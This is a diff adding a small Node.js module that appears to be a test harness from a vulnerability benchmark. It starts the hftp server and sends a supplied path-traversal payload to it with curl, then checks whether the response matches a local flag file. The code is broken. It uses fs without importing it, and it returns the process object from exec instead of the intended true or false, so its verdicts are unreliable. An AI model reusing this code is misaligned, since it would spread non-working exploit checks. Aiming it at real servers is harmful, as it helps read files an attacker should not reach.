@@ -1,0 +1,26 @@
+function exploitFunction(payload) {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const { exec } = require("child_process");
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+  const hostsFile = fs.readFileSync(pathToFlag).toString();
+
+  let server = "node ./node_modules/hftp/bin/hftp";
+  let exe = exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+  let val = exec(attack_string, (error, stdout) => {
+    if (stdout === hostsFile) {
+      return true;
+    }
+    return false;
+  });
+
+  return val;
+}
+
+module.exports = { exploitFunction };
